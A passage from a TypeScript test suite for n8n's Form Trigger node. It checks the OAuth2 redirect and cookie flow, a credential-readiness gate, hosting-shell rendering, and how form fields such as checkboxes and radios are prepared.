			(ctx as any).logger = { warn: vi.fn(), error: vi.fn(), debug: vi.fn(), info: vi.fn() };

			return { status, send, json, writeHead, end, setHeader, render, cookie, clearCookie };
		};

		beforeEach(() => {
			vi.clearAllMocks();
		});

		it('redirects to the authorization URL on GET without a code', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { writeHead, end } = setupContext(ctx, { method: 'GET' });
			ctx.beginN8nOAuth2Flow.mockResolvedValue('http://localhost:5678/oauth/authorize?state=abc');

			const result = await formWebhook(ctx);

			expect(ctx.beginN8nOAuth2Flow).toHaveBeenCalledWith(resourceUrl, undefined);
			expect(writeHead).toHaveBeenCalledWith(302, {
				Location: 'http://localhost:5678/oauth/authorize?state=abc',
			});
			expect(end).toHaveBeenCalled();
			expect(result).toEqual({ noWebhookResponse: true });
		});

		// A value that isn't valid percent-encoding must read as no cookie, so the flow
		// simply restarts instead of the request failing.
		it('restarts the flow when the one-hop cookie value cannot be decoded', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { writeHead } = setupContext(ctx, {
				method: 'GET',
				headers: { cookie: 'n8n-form-oauth=%E0%A4%A' },
			});
			ctx.beginN8nOAuth2Flow.mockResolvedValue('http://localhost:5678/oauth/authorize?state=abc');

			const result = await formWebhook(ctx);

			expect(ctx.validateN8nOAuth2Token).not.toHaveBeenCalled();
			expect(writeHead).toHaveBeenCalledWith(302, {
				Location: 'http://localhost:5678/oauth/authorize?state=abc',
			});
			expect(result).toEqual({ noWebhookResponse: true });
		});

		it('responds 403 without restarting the flow when consent is denied', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { status, send } = setupContext(ctx, {
				method: 'GET',
				query: { error: 'access_denied', error_description: 'User denied', state: 'the-state' },
			});

			const result = await formWebhook(ctx);

			expect(status).toHaveBeenCalledWith(403);
			expect(send).toHaveBeenCalled();
			expect(ctx.beginN8nOAuth2Flow).not.toHaveBeenCalled();
			expect(result).toEqual({ noWebhookResponse: true });
		});

		it('restarts the flow when the callback fails validation', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { writeHead } = setupContext(ctx, {
				method: 'GET',
				query: { code: 'the-code', state: 'the-state' },
			});
			ctx.completeN8nOAuth2Flow.mockResolvedValue({ valid: false, reason: 'invalid_state' });
			ctx.beginN8nOAuth2Flow.mockResolvedValue('http://localhost:5678/oauth/authorize?state=fresh');

			const result = await formWebhook(ctx);

			expect(ctx.completeN8nOAuth2Flow).toHaveBeenCalledWith('the-code', 'the-state');
			expect(ctx.beginN8nOAuth2Flow).toHaveBeenCalledWith(resourceUrl, undefined);
			expect(writeHead).toHaveBeenCalledWith(302, {
				Location: 'http://localhost:5678/oauth/authorize?state=fresh',
			});
			expect(result).toEqual({ noWebhookResponse: true });
		});

		it('redirects to a clean URL with the token in a cookie on a valid callback', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { render, writeHead, cookie } = setupContext(ctx, {
				method: 'GET',
				query: { code: 'the-code', state: 'the-state' },
			});
			ctx.completeN8nOAuth2Flow.mockResolvedValue({
				valid: true,
				token: 'as-token',
				refreshToken: 'refresh-token',
				expiresIn: 3600,
				user: authedUser,
			});

			const result = await formWebhook(ctx);

			expect(ctx.completeN8nOAuth2Flow).toHaveBeenCalledWith('the-code', 'the-state');
			expect(ctx.beginN8nOAuth2Flow).not.toHaveBeenCalled();
			// The code/state must not reach the sandboxed form page: redirect to the
			// clean resource URL instead of rendering here.
			expect(render).not.toHaveBeenCalled();
			expect(writeHead).toHaveBeenCalledWith(302, { Location: resourceUrl });
			expect(cookie).toHaveBeenCalledWith(
				'n8n-form-oauth',
				'as-token',
				expect.objectContaining({ httpOnly: true, sameSite: 'lax' }),
			);
			expect(result).toEqual({ noWebhookResponse: true });
		});

		it('stashes the original query params as flow metadata on a fresh GET before redirecting', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { writeHead } = setupContext(ctx, {
				method: 'GET',
				originalUrl: '/form/test?foo=bar',
			});
			ctx.beginN8nOAuth2Flow.mockResolvedValue('http://localhost:5678/oauth/authorize?state=abc');

			const result = await formWebhook(ctx);

			expect(ctx.beginN8nOAuth2Flow).toHaveBeenCalledWith(resourceUrl, { query: 'foo=bar' });
			expect(writeHead).toHaveBeenCalledWith(302, {
				Location: 'http://localhost:5678/oauth/authorize?state=abc',
			});
			expect(result).toEqual({ noWebhookResponse: true });
		});

		it('preserves a lone code query param as flow metadata on a fresh GET', async () => {
			// A form field literally named `code` (or `state`) is not a provider callback
			// (which needs both), so it is a genuine fresh GET and must be preserved.
			const ctx = mock<IWebhookFunctions>();
			setupContext(ctx, {
				method: 'GET',
				query: { foo: 'bar', code: 'x' },
				originalUrl: '/form/test?foo=bar&code=x',
			});
			ctx.beginN8nOAuth2Flow.mockResolvedValue('http://localhost:5678/oauth/authorize?state=abc');

			await formWebhook(ctx);

			expect(ctx.completeN8nOAuth2Flow).not.toHaveBeenCalled();
			expect(ctx.beginN8nOAuth2Flow).toHaveBeenCalledWith(resourceUrl, { query: 'foo=bar&code=x' });
		});

		it('re-appends the query stashed as flow metadata on a valid callback', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { writeHead } = setupContext(ctx, {
				method: 'GET',
				query: { code: 'the-code', state: 'the-state' },
			});
			ctx.completeN8nOAuth2Flow.mockResolvedValue({
				valid: true,
				token: 'as-token',
				refreshToken: 'refresh-token',
				expiresIn: 3600,
				user: authedUser,
				metadata: { query: 'foo=bar' },
			});

			const result = await formWebhook(ctx);

			expect(writeHead).toHaveBeenCalledWith(302, { Location: `${resourceUrl}?foo=bar` });
			expect(result).toEqual({ noWebhookResponse: true });
		});

		it('does not stash code/state as flow metadata on a callback fall-through', async () => {
			const ctx = mock<IWebhookFunctions>();
			setupContext(ctx, {
				method: 'GET',
				query: { code: 'the-code', state: 'the-state' },
				originalUrl: '/form/test?code=the-code&state=the-state',
			});
			ctx.completeN8nOAuth2Flow.mockResolvedValue({ valid: false, reason: 'invalid_state' });
			ctx.beginN8nOAuth2Flow.mockResolvedValue('http://localhost:5678/oauth/authorize?state=fresh');

			await formWebhook(ctx);

			expect(ctx.beginN8nOAuth2Flow).toHaveBeenCalledWith(resourceUrl, undefined);
		});

		it('renders the form on the clean GET carrying the oauth cookie', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { render, clearCookie } = setupContext(ctx, {
				method: 'GET',
				headers: { cookie: 'n8n-form-oauth=as-token' },
			});
			ctx.validateN8nOAuth2Token.mockResolvedValue({ valid: true, user: authedUser });

			const result = await formWebhook(ctx);

			expect(ctx.validateN8nOAuth2Token).toHaveBeenCalledWith('as-token', resourceUrl);
			expect(ctx.beginN8nOAuth2Flow).not.toHaveBeenCalled();
			expect(clearCookie).toHaveBeenCalledWith('n8n-form-oauth', expect.any(Object));
			expect(render).toHaveBeenCalledWith(
				'form-trigger',
				expect.objectContaining({ authToken: 'as-token' }),
			);
			expect(result).toEqual({ noWebhookResponse: true });
		});

		it('restarts the flow when the cookie token is invalid', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { writeHead, render } = setupContext(ctx, {
				method: 'GET',
				headers: { cookie: 'n8n-form-oauth=stale-token' },
			});
			ctx.validateN8nOAuth2Token.mockResolvedValue({ valid: false, reason: 'invalid_token' });
			ctx.beginN8nOAuth2Flow.mockResolvedValue('http://localhost:5678/oauth/authorize?state=fresh');

			const result = await formWebhook(ctx);

			expect(ctx.validateN8nOAuth2Token).toHaveBeenCalledWith('stale-token', resourceUrl);
			expect(ctx.beginN8nOAuth2Flow).toHaveBeenCalledWith(resourceUrl, undefined);
			expect(writeHead).toHaveBeenCalledWith(302, {
				Location: 'http://localhost:5678/oauth/authorize?state=fresh',
			});
			expect(render).not.toHaveBeenCalled();
			expect(result).toEqual({ noWebhookResponse: true });
		});

		it('establishes the submitter identity on POST with a valid token', async () => {
			const ctx = mock<IWebhookFunctions>();
			setupContext(ctx, { method: 'POST', headers: { 'x-auth-token': 'as-token' } });
			ctx.validateN8nOAuth2Token.mockResolvedValue({ valid: true, user: authedUser });

			const result = await formWebhook(ctx);

			expect(ctx.validateN8nOAuth2Token).toHaveBeenCalledWith('as-token', resourceUrl);
			expect(ctx.establishTriggerIdentity).toHaveBeenCalledWith('as-token', resourceUrl);
			expect(result).toMatchObject({ webhookResponse: { status: 200 } });
		});

		it('returns 401 on POST with an invalid token', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { status, send } = setupContext(ctx, {
				method: 'POST',
				headers: { 'x-auth-token': 'bad-token' },
			});
			ctx.validateN8nOAuth2Token.mockResolvedValue({ valid: false, reason: 'invalid_token' });

			const result = await formWebhook(ctx);

			expect(ctx.establishTriggerIdentity).not.toHaveBeenCalled();
			expect(status).toHaveBeenCalledWith(401);
			expect(send).toHaveBeenCalled();
			expect(result).toEqual({ noWebhookResponse: true });
		});

		it('sets hasAuthenticatedSubmitter so the form handles a submit-time gate rejection', async () => {
			const ctx = mock<IWebhookFunctions>();
			const { render } = setupContext(ctx, {
				method: 'GET',
				headers: { cookie: 'n8n-form-oauth=as-token' },
			});
			ctx.validateN8nOAuth2Token.mockResolvedValue({ valid: true, user: authedUser });

			await formWebhook(ctx);

			expect(render).toHaveBeenCalledWith(
				'form-trigger',
				expect.objectContaining({ hasAuthenticatedSubmitter: true }),
			);
		});

		it('includes the submitter in the trigger output on POST', async () => {
			const ctx = mock<IWebhookFunctions>();
			setupContext(ctx, { method: 'POST', headers: { 'x-auth-token': 'as-token' } });
			ctx.validateN8nOAuth2Token.mockResolvedValue({ valid: true, user: authedUser });

			const result = await formWebhook(ctx);

			expect(result).toMatchObject({
				webhookResponse: { status: 200 },
				workflowData: [[{ json: expect.objectContaining({ user: authedUser }) }]],
			});
		});

		it('omits the submitter when includeUserInOutput is false', async () => {
			const ctx = mock<IWebhookFunctions>();
			setupContext(ctx, {
				method: 'POST',
				headers: { 'x-auth-token': 'as-token' },
				options: { includeUserInOutput: false },
			});
			ctx.validateN8nOAuth2Token.mockResolvedValue({ valid: true, user: authedUser });

			const result = await formWebhook(ctx);

			const json = (result as any).workflowData[0][0].json;
			expect(json.user).toBeUndefined();
		});

		describe('submit-time credential readiness gate', () => {
			const notReady: CredentialCheckResult = {
				readyToExecute: false,
				credentials: [
					{
						credentialId: 'cred-missing',
						credentialName: 'My Gmail',
						credentialType: 'gmailOAuth2',
						resolverId: 'resolver-1',
						status: 'missing',
						authorizationUrl: 'https://example.com/authorize',
						revokeUrl: 'https://example.com/revoke',
					},
					{
						credentialId: 'cred-connected',
						credentialName: 'My CRM',
						credentialType: 'hubspotOAuth2',
						resolverId: 'resolver-2',
						status: 'configured',
					},
				],
			};

			const setupAuthedPost = (
				ctx: ReturnType<typeof mock<IWebhookFunctions>>,
				nodeType?: string,
			) => {
				const res = setupContext(ctx, {
					method: 'POST',
					headers: { 'x-auth-token': 'as-token' },
					nodeType,
				});
				ctx.validateN8nOAuth2Token.mockResolvedValue({ valid: true, user: authedUser });
				return res;
			};

			it('returns 428 with the structured body and no workflowData when not ready', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { status, json } = setupAuthedPost(ctx);
				ctx.checkTriggerCredentialStatus.mockResolvedValue(notReady);

				const result = await formWebhook(ctx);

				expect(status).toHaveBeenCalledWith(428);
				expect(json).toHaveBeenCalledWith({
					status: 'credential_connections_required',
					readyToExecute: false,
					credentials: [
						{
							credentialId: 'cred-missing',
							credentialName: 'My Gmail',
							credentialType: 'gmailOAuth2',
							credentialStatus: 'missing',
						},
						{
							credentialId: 'cred-connected',
							credentialName: 'My CRM',
							credentialType: 'hubspotOAuth2',
							credentialStatus: 'configured',
						},
					],
				});
				// The connect links belong to the trusted host, not the sandboxed page.
				for (const credential of json.mock.calls[0][0].credentials) {
					expect(credential).not.toHaveProperty('authorizationUrl');
					expect(credential).not.toHaveProperty('revokeUrl');
				}
				expect(result).toEqual({ noWebhookResponse: true });
			});

			it('enqueues the execution when the check reports ready', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { status } = setupAuthedPost(ctx);
				ctx.checkTriggerCredentialStatus.mockResolvedValue({
					readyToExecute: true,
					credentials: [notReady.credentials[1]],
				});

				const result = await formWebhook(ctx);

				expect(status).not.toHaveBeenCalled();
				expect(result).toMatchObject({
					webhookResponse: { status: 200 },
					workflowData: [[expect.anything()]],
				});
			});

			it('enqueues the execution when no check applies', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { status } = setupAuthedPost(ctx);
				ctx.checkTriggerCredentialStatus.mockResolvedValue(undefined);

				const result = await formWebhook(ctx);

				expect(status).not.toHaveBeenCalled();
				expect(result).toMatchObject({
					webhookResponse: { status: 200 },
					workflowData: [[expect.anything()]],
				});
			});

			it('fails closed with 503 when the check throws', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { status, json } = setupAuthedPost(ctx);
				const error = new Error('could not decrypt credential context');
				ctx.checkTriggerCredentialStatus.mockRejectedValue(error);

				const result = await formWebhook(ctx);

				expect(status).toHaveBeenCalledWith(503);
				expect(json).toHaveBeenCalledWith({ status: 'credential_readiness_check_failed' });
				expect(ctx.logger.error).toHaveBeenCalledWith(
					'Form submit credential readiness check failed',
					{ error },
				);
				expect(result).toEqual({ noWebhookResponse: true });
			});

			it('does not gate a Wait node form resume', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { status } = setupAuthedPost(ctx, WAIT_NODE_TYPE);
				ctx.checkTriggerCredentialStatus.mockResolvedValue(notReady);

				const result = await formWebhook(ctx);

				expect(ctx.checkTriggerCredentialStatus).not.toHaveBeenCalled();
				expect(status).not.toHaveBeenCalled();
				expect(result).toMatchObject({
					webhookResponse: { status: 200 },
					workflowData: [[expect.anything()]],
				});
			});
		});

		describe('hosting shell on GET', () => {
			const missing: CredentialCheckStatus = {
				credentialId: 'cred-missing',
				credentialName: 'My Gmail',
				credentialType: 'gmailOAuth2',
				resolverId: 'resolver-1',
				status: 'missing',
				authorizationUrl: 'https://example.com/authorize',
			};
			const configured: CredentialCheckStatus = {
				credentialId: 'cred-connected',
				credentialName: 'My CRM',
				credentialType: 'hubspotOAuth2',
				resolverId: 'resolver-2',
				status: 'configured',
				revokeUrl: 'https://example.com/revoke?resolverId=resolver-2',
			};

			const setupAuthedGet = (
				ctx: ReturnType<typeof mock<IWebhookFunctions>>,
				overrides: { query?: IDataObject; headers?: Record<string, string> } = {},
			) => {
				const res = setupContext(ctx, {
					method: 'GET',
					query: overrides.query,
					headers: { cookie: 'n8n-form-oauth=as-token', ...(overrides.headers ?? {}) },
				});
				ctx.validateN8nOAuth2Token.mockResolvedValue({ valid: true, user: authedUser });
				return res;
			};

			it('renders the shell while an account is still missing', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { render } = setupAuthedGet(ctx);
				ctx.checkTriggerCredentialStatus.mockResolvedValue({
					readyToExecute: false,
					credentials: [missing, configured],
				});

				const result = await formWebhook(ctx);

				expect(render).toHaveBeenCalledWith(
					'form-shell',
					expect.objectContaining({ total: 2, connectedCount: 1, allConnected: false }),
				);
				expect(result).toEqual({ noWebhookResponse: true });
			});

			// The panel must survive the reload right after connecting, or the submitter
			// loses every way to see and revoke the accounts the form runs on.
			it('keeps rendering the shell once every account is connected', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { render } = setupAuthedGet(ctx);
				ctx.checkTriggerCredentialStatus.mockResolvedValue({
					readyToExecute: true,
					credentials: [configured],
				});

				const result = await formWebhook(ctx);

				expect(render).toHaveBeenCalledWith(
					'form-shell',
					expect.objectContaining({
						total: 1,
						connectedCount: 1,
						allConnected: true,
						credentials: [
							expect.objectContaining({
								id: 'cred-connected',
								connected: true,
								account: authedUser.email,
								revokeUrl: configured.revokeUrl,
							}),
						],
					}),
				);
				expect(result).toEqual({ noWebhookResponse: true });
			});

			it('renders the plain form when the trigger needs no end-user accounts', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { render } = setupAuthedGet(ctx);
				ctx.checkTriggerCredentialStatus.mockResolvedValue({
					readyToExecute: true,
					credentials: [],
				});

				const result = await formWebhook(ctx);

				expect(render).toHaveBeenCalledWith('form-trigger', expect.any(Object));
				expect(result).toEqual({ noWebhookResponse: true });
			});

			it('renders the plain form for the shell inner iframe GET', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { render } = setupAuthedGet(ctx, {
					query: { n8nShellInner: '1' },
					headers: { 'sec-fetch-dest': 'iframe' },
				});
				ctx.checkTriggerCredentialStatus.mockResolvedValue({
					readyToExecute: true,
					credentials: [configured],
				});

				const result = await formWebhook(ctx);

				expect(render).toHaveBeenCalledWith(
					'form-trigger',
					expect.objectContaining({ shellInner: true }),
				);
				expect(result).toEqual({ noWebhookResponse: true });
			});

			// A typed-in ?n8nShellInner=1 is a top-level document navigation, not the
			// shell iframe. Honoring the flag there would skip the connect UI.
			it('still renders the hosting shell for a hand-typed n8nShellInner URL', async () => {
				const ctx = mock<IWebhookFunctions>();
				const { render } = setupAuthedGet(ctx, {
					query: { n8nShellInner: '1' },
					headers: { 'sec-fetch-dest': 'document' },
				});
				ctx.checkTriggerCredentialStatus.mockResolvedValue({
					readyToExecute: true,
					credentials: [configured],
				});

				const result = await formWebhook(ctx);

				expect(render).toHaveBeenCalledWith('form-shell', expect.any(Object));
				expect(result).toEqual({ noWebhookResponse: true });
			});
		});
	});
});

describe('FormTrigger, prepareFormData', () => {
	it('should return valid form data with given parameters', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Name',
				fieldType: 'text',
				requiredField: true,
				placeholder: 'Enter your name',
			},
			{
				fieldLabel: 'Email',
				fieldType: 'email',
				requiredField: true,
				placeholder: 'Enter your email',
			},
			{
				fieldLabel: 'Gender',
				fieldType: 'dropdown',
				requiredField: false,
				fieldOptions: { values: [{ option: 'Male' }, { option: 'Female' }] },
			},
			{
				fieldLabel: 'Files',
				fieldType: 'file',
				requiredField: false,
				acceptFileTypes: '.jpg,.png',
				multipleFiles: true,
			},
			{
				fieldLabel: 'username',
				fieldName: 'username',
				fieldValue: 'powerpuffgirl125',
				fieldType: 'hiddenField',
			},
			{
				fieldLabel: 'villain',
				fieldName: 'villain',
				fieldValue: 'Mojo Dojo',
				fieldType: 'hiddenField',
			},
		];

		const query = { Name: 'John Doe', Email: 'john@example.com', villain: 'princess morbucks' };

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you for your submission',
			redirectUrl: 'https://example.com/thank-you',
			formFields,
			testRun: false,
			query,
			instanceId: 'test-instance',
			useResponseData: true,
			buttonLabel: 'Submit',
		});

		expect(result).toEqual({
			testRun: false,
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formDescriptionMetadata: 'This is a test form',
			formSubmittedText: 'Thank you for your submission',
			n8nWebsiteLink:
				'https://n8n.io/?utm_source=n8n-internal&utm_medium=form-trigger&utm_campaign=test-instance',
			formFields: [
				{
					id: 'field-0',
					errorId: 'error-field-0',
					label: 'Name',
					inputRequired: 'form-required',
					defaultValue: 'John Doe',
					placeholder: 'Enter your name',
					isInput: true,
					type: 'text',
				},
				{
					id: 'field-1',
					errorId: 'error-field-1',
					label: 'Email',
					inputRequired: 'form-required',
					defaultValue: 'john@example.com',
					placeholder: 'Enter your email',
					isInput: true,
					type: 'email',
				},
				{
					id: 'field-2',
					errorId: 'error-field-2',
					label: 'Gender',
					inputRequired: '',
					defaultValue: '',
					placeholder: undefined,
					isSelect: true,
					selectOptions: ['Male', 'Female'],
				},
				{
					id: 'field-3',
					errorId: 'error-field-3',
					label: 'Files',
					inputRequired: '',
					defaultValue: '',
					placeholder: undefined,
					isFileInput: true,
					acceptFileTypes: '.jpg,.png',
					multipleFiles: 'multiple',
				},
				{
					id: 'field-4',
					errorId: 'error-field-4',
					label: 'username',
					inputRequired: '',
					defaultValue: '',
					placeholder: undefined,
					hiddenName: 'username',
					hiddenValue: 'powerpuffgirl125',
					isHidden: true,
				},
				{
					id: 'field-5',
					errorId: 'error-field-5',
					label: 'villain',
					inputRequired: '',
					defaultValue: 'princess morbucks',
					placeholder: undefined,
					hiddenName: 'villain',
					isHidden: true,
					hiddenValue: 'princess morbucks',
				},
			],
			useResponseData: true,
			appendAttribution: true,
			buttonLabel: 'Submit',
			redirectUrl: 'https://example.com/thank-you',
		});
	});

	it('should handle missing optional fields gracefully', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Name',
				fieldType: 'text',
				requiredField: true,
				placeholder: 'Enter your name',
			},
		];

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: undefined,
			redirectUrl: undefined,
			formFields,
			testRun: true,
			query: {},
			buttonLabel: 'Submit',
		});

		expect(result).toEqual({
			testRun: true,
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formDescriptionMetadata: 'This is a test form',
			formSubmittedText: 'Your response has been recorded',
			n8nWebsiteLink: 'https://n8n.io/?utm_source=n8n-internal&utm_medium=form-trigger',
			formFields: [
				{
					id: 'field-0',
					errorId: 'error-field-0',
					label: 'Name',
					inputRequired: 'form-required',
					defaultValue: '',
					placeholder: 'Enter your name',
					isInput: true,
					type: 'text',
				},
			],
			useResponseData: undefined,
			appendAttribution: true,
			buttonLabel: 'Submit',
		});
	});

	it('should set redirectUrl with https if protocol is missing', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Name',
				fieldType: 'text',
				requiredField: true,
				placeholder: 'Enter your name',
			},
		];

		const query = { Name: 'John Doe' };

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: undefined,
			redirectUrl: 'example.com/thank-you',
			formFields,
			testRun: true,
			query,
		});

		expect(result.redirectUrl).toBe('https://example.com/thank-you');
	});

	it('should return invalid form data when formFields are empty', () => {
		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: undefined,
			redirectUrl: undefined,
			formFields: [],
			testRun: true,
			query: {},
		});

		expect(result.formFields).toEqual([]);
	});

	it('should correctly handle multiselect fields', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Favorite Colors',
				fieldType: 'text',
				requiredField: true,
				multiselect: true,
				fieldOptions: { values: [{ option: 'Red' }, { option: 'Blue' }, { option: 'Green' }] },
			},
		];

		const query = { 'Favorite Colors': 'Red,Blue' };

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0].isMultiSelect).toBe(true);
		expect(result.formFields[0].multiSelectOptions).toEqual([
			{ id: 'option0_field-0', label: 'Red' },
			{ id: 'option1_field-0', label: 'Blue' },
			{ id: 'option2_field-0', label: 'Green' },
		]);
	});
	it('should correctly handle multiselect fields with unique ids', () => {
		const formFields = [
			{
				fieldLabel: 'Favorite Colors',
				fieldType: 'text',
				requiredField: true,
				multiselect: true,
				fieldOptions: { values: [{ option: 'Red' }, { option: 'Blue' }, { option: 'Green' }] },
			},
			{
				fieldLabel: 'Favorite Colors',
				fieldType: 'text',
				requiredField: true,
				multiselect: true,
				fieldOptions: { values: [{ option: 'Red' }, { option: 'Blue' }, { option: 'Green' }] },
			},
		];

		const query = { 'Favorite Colors': 'Red,Blue' };

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0].isMultiSelect).toBe(true);
		expect(result.formFields[0].multiSelectOptions).toEqual([
			{ id: 'option0_field-0', label: 'Red' },
			{ id: 'option1_field-0', label: 'Blue' },
			{ id: 'option2_field-0', label: 'Green' },
		]);
		expect(result.formFields[1].multiSelectOptions).toEqual([
			{ id: 'option0_field-1', label: 'Red' },
			{ id: 'option1_field-1', label: 'Blue' },
			{ id: 'option2_field-1', label: 'Green' },
		]);
	});
});

describe('FormTrigger, prepareFormData - Checkbox and Radio Fields', () => {
	it('should correctly handle checkbox fields', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Hobbies',
				fieldType: 'checkbox',
				requiredField: false,
				fieldOptions: {
					values: [{ option: 'Reading' }, { option: 'Gaming' }, { option: 'Sports' }],
				},
			},
		];

		const query = { Hobbies: 'Reading,Gaming' };

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0].isMultiSelect).toBe(true);
		expect(result.formFields[0].multiSelectOptions).toEqual([
			{ id: 'option0_field-0', label: 'Reading' },
			{ id: 'option1_field-0', label: 'Gaming' },
			{ id: 'option2_field-0', label: 'Sports' },
		]);
	});

	it('should correctly handle radio fields', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Preferred Contact Method',
				fieldType: 'radio',
				requiredField: true,
				fieldOptions: {
					values: [{ option: 'Email' }, { option: 'Phone' }, { option: 'Text Message' }],
				},
			},
		];

		const query = { 'Preferred Contact Method': 'Email' };

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0].radioSelect).toBe('radio');
		expect(result.formFields[0].multiSelectOptions).toEqual([
			{ id: 'option0_field-0', label: 'Email' },
			{ id: 'option1_field-0', label: 'Phone' },
			{ id: 'option2_field-0', label: 'Text Message' },
		]);
		expect(result.formFields[0].defaultValue).toBe('Email');
	});

	it('should handle checkbox fields with no default selection', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Newsletter Subscriptions',
				fieldType: 'checkbox',
				requiredField: false,
				fieldOptions: {
					values: [{ option: 'Tech News' }, { option: 'Product Updates' }],
				},
			},
		];

		const query = {};

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0].isMultiSelect).toBe(true);
		expect(result.formFields[0].defaultValue).toBe('');
		expect(result.formFields[0].multiSelectOptions).toEqual([
			{ id: 'option0_field-0', label: 'Tech News' },
			{ id: 'option1_field-0', label: 'Product Updates' },
		]);
	});

	it('should handle radio fields with no default selection', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Experience Level',
				fieldType: 'radio',
				requiredField: false,
				fieldOptions: {
					values: [{ option: 'Beginner' }, { option: 'Intermediate' }, { option: 'Advanced' }],
				},
			},
		];

		const query = {};

		const result = prepareFormData({
			formTitle: 'Test Form',
			formDescription: 'This is a test form',
			formSubmittedText: 'Thank you',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0].radioSelect).toBe('radio');
		expect(result.formFields[0].defaultValue).toBe('');
		expect(result.formFields[0].multiSelectOptions).toEqual([
			{ id: 'option0_field-0', label: 'Beginner' },
			{ id: 'option1_field-0', label: 'Intermediate' },
			{ id: 'option2_field-0', label: 'Advanced' },
		]);
	});

	it('should handle mixed form with checkbox, radio, and other field types', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Name',
				fieldType: 'text',
				requiredField: true,
				placeholder: 'Enter your name',
			},
			{
				fieldLabel: 'Skills',
				fieldType: 'checkbox',
				requiredField: false,
				fieldOptions: {
					values: [{ option: 'JavaScript' }, { option: 'Python' }, { option: 'Java' }],
				},
			},
			{
				fieldLabel: 'Employment Status',
				fieldType: 'radio',
				requiredField: true,
				fieldOptions: {
					values: [{ option: 'Full-time' }, { option: 'Part-time' }, { option: 'Freelancer' }],
				},
			},
		];

		const query = {
			Name: 'John Doe',
			Skills: 'JavaScript,Python',
			'Employment Status': 'Full-time',
		};

		const result = prepareFormData({
			formTitle: 'Developer Survey',
			formDescription: 'Tell us about yourself',
			formSubmittedText: 'Thank you for participating',
			redirectUrl: 'example.com/thanks',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0]).toEqual({
			id: 'field-0',
			errorId: 'error-field-0',
			label: 'Name',
			inputRequired: 'form-required',
			defaultValue: 'John Doe',
			placeholder: 'Enter your name',
			isInput: true,
			type: 'text',
		});

		expect(result.formFields[1].isMultiSelect).toBe(true);
		expect(result.formFields[1].multiSelectOptions).toEqual([
			{ id: 'option0_field-1', label: 'JavaScript' },
			{ id: 'option1_field-1', label: 'Python' },
			{ id: 'option2_field-1', label: 'Java' },
		]);

		expect(result.formFields[2].radioSelect).toBe('radio');
		expect(result.formFields[2].defaultValue).toBe('Full-time');
		expect(result.formFields[2].multiSelectOptions).toEqual([
			{ id: 'option0_field-2', label: 'Full-time' },
			{ id: 'option1_field-2', label: 'Part-time' },
			{ id: 'option2_field-2', label: 'Freelancer' },
		]);
	});

	it('should handle checkbox fields with unique IDs when multiple checkbox fields exist', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Programming Languages',
				fieldType: 'checkbox',
				requiredField: false,
				fieldOptions: {
					values: [{ option: 'JavaScript' }, { option: 'Python' }],
				},
			},
			{
				fieldLabel: 'Frameworks',
				fieldType: 'checkbox',
				requiredField: false,
				fieldOptions: {
					values: [{ option: 'React' }, { option: 'Vue' }],
				},
			},
		];

		const query = {
			'Programming Languages': 'JavaScript',
			Frameworks: 'React,Vue',
		};

		const result = prepareFormData({
			formTitle: 'Tech Survey',
			formDescription: 'Your tech preferences',
			formSubmittedText: 'Thanks!',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0].multiSelectOptions).toEqual([
			{ id: 'option0_field-0', label: 'JavaScript' },
			{ id: 'option1_field-0', label: 'Python' },
